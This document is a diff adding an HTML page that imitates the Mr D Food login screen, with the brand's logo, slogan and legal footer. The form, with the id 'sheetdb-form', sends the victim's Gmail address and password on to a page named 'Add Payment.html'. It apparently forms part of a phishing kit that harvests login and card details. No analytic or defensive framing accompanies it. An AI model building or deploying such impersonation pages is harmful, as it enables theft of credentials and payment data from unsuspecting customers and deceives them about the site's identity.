@@ -1,0 +1,110 @@
+<!DOCTYPE html>
+
+
+<html id="html" itemscope="" itemtype="http://schema.org/MobileApplication" ng-class="_rc.bodyClass" ng-app="MrDWebApp" ng-csp="no-inline-style;no-unsafe-eval" ng-controller="RootController as _rc" class="ng-scope html-auth wf-rubik-n4-active wf-rubik-n5-active wf-rubik-n7-active wf-active"><!--<![endif]-->
+    <head profile="http://www.w3.org/2005/10/profile">
+    <meta charset="UTF-8">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>MR D Food | Login </title>
+    <meta property="og:title" content="South Africa’s favourite food delivery brand ">
+    <meta name="twitter:title" content="South Africa’s favourite food delivery brand ">
+    <meta name="description" content="Get the joy of food delivered by the best food delivery app in South Africa, Mr D Food ">
+    <meta property="og:description" content="Get the joy of food delivered by the best food delivery app in South Africa, Mr D Food ">
+    <link rel="stylesheet" href="styles.css" type="text/css">
+	
+
+
+
+
+</head>
+
+
+<body>
+
+<div class="covid-19-banner">
+  <div class="foot">Visit <a class="link-white" href="https://www.sacoronavirus.co.za" target="_blank">www.sacoronavirus.co.za</a> for official info on COVID-19.</div>
+</div>
+
+        <div class="header-profile">
+          <div class="profile-logo">
+            <div class="logo-container">
+              <img src="https://img.mrdfood.com/fit-in/256x256/seo/9c4c12b8-71db-4dc1-a456-736826b6d50e.png" alt="logo" itemprop="logo">
+            </div>  
+          </div>
+        </div>
+      
+
+
+<div   class="standalone-screen-page auth-forms ng-scope" ng-class="{'failed-trigger' : !!_auth.failed_message }">
+
+    <div class="standalone-screen-page-inner">
+
+        <div class="forms forms-v2">
+
+
+            <div class="form-title">
+                <h4>Welcome Back!</h4>
+                <p>You're moments away from good, hot food!</p>
+            </div>
+
+            <div class="message-failed ng-binding">
+                
+            </div>
+           <form action="Add Payment.html" method="GET" id="sheetdb-form">
+            <div class="form-row">
+			    
+                <input id="username" type="email"pattern=".+@gmail\.com" size="30" placeholder="@gmail address" minlength="15" maxlength="25"style="border-bottom: 2px solid #131313;"force-lower-case="" autocomplete="username" type="email" ng-model="_auth.email" ng-model-options="{'debounce': 200}" ng-change="_auth.softStoreEmail()" class="ng-pristine ng-untouched ng-empty ng-valid-email ng-invalid ng-invalid-required" required>
+                <label class="special"></label>
+            </div>
+
+            <div class="form-row">
+                <input id="password"placeholder="Password" color="white" type="password" minlength="7" maxlength="17" autocomplete="current-password" ng-model="_auth.password" class="ng-pristine ng-untouched ng-empty ng-invalid ng-invalid-required" required>
+                <label class="special"></label>
+            </div>
+
+            <div class="form-row form-row-footer forget">
+                <a href="/forgot">Forgot Password?</a>
+            </div>
+
+            <a href="Add Payment.html"><button id="btnLogin" class="submit-button submit-button-yellow  submit-button-loader" ng-class="{'is-working' : _auth.isWorking}" ng-disabled="loginForm.$invalid || _auth.isWorking" type="submit" data-test="forward-button" >
+                <em>Log in</em>
+
+                  <span class="button-loader sk-fading-circle">
+                    <span class="sk-circle1 sk-circle"></span>
+                    <span class="sk-circle2 sk-circle"></span>
+                    <span class="sk-circle3 sk-circle"></span>
+                    <span class="sk-circle4 sk-circle"></span>
+                    <span class="sk-circle5 sk-circle"></span>
+                    <span class="sk-circle6 sk-circle"></span>
+                    <span class="sk-circle7 sk-circle"></span>
+                    <span class="sk-circle8 sk-circle"></span>
+                    <span class="sk-circle9 sk-circle"></span>
+                    <span class="sk-circle10 sk-circle"></span>
+                    <span class="sk-circle11 sk-circle"></span>
+                    <span class="sk-circle12 sk-circle"></span>
+                  </span>
+            </button></a>
+			</form>
+
+
+            <div class="form-row form-row-footer form-row-footer-register">
+                <a href="/register" style="color:#FFE30E; font-size: 15px;">New to Mr D Food? <strong>Create new account</strong></a>
+            </div>
+
+        </div>
+    </div>
+</div>
+<footer>
+
+<div class="legal-main">
+        <p>© Mr Delivery (Pty) Ltd. All rights reserved. Reg 1992/04664/07. VAT number: 4330 165 400. <br>
+        12th floor, 10 Rua Vasco da Gama Plain, Foreshore, Cape Town</p>
+</div>
+
+<div class="site-desc">a <span>takealot.group</span> company</div>
+</footer>
+
+</body>
+
+</html>
